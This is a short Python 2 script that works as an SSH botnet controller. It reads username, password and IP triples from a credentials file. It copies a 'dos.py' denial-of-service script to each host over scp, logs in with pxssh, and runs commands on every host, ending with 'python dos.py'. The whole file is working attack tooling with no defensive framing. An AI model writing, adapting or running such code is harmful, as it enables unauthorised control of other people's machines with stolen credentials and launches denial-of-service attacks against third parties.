#!/usr/bin/python
# -*- coding: utf-8 -*-
import optparse
#import pxssh
from pexpect import pxssh
import pexpect

class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output 

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

def sendDoSFile(host,user,password):
    connStr = 'scp dos.py ' + user + '@' + host + ':~'
    child = pexpect.spawn(connStr)
    child.expect(['password:'])
    child.sendline(password)
    child.expect(['/'])####can't loss this line

def main():
    ipFile = open('sshpass.txt', 'r')
    for line in ipFile.readlines():
        user = line.split(':')[0]
        passwd = line.split(':')[1]
        ip = line.split(':')[2].strip('\n').strip('\r')
        sendDoSFile(ip, user, passwd)
        addClient(ip, user, passwd)

    botnetCommand('uname -v')
    botnetCommand('python dos.py')

botNet = []

if __name__ == '__main__':
	main()


